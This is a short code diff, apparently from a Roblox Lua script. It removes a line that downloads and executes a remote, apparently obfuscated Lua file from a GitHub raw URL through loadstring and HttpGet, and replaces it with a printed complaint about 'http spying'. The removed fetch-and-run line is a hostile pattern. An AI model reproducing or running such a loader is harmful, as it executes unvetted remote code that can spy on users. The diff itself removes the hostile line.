@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/h4xal0t/wtf/main/Protected_9909131513277395.lua.txt"))()
+print("please stop the http spying, not cool...")
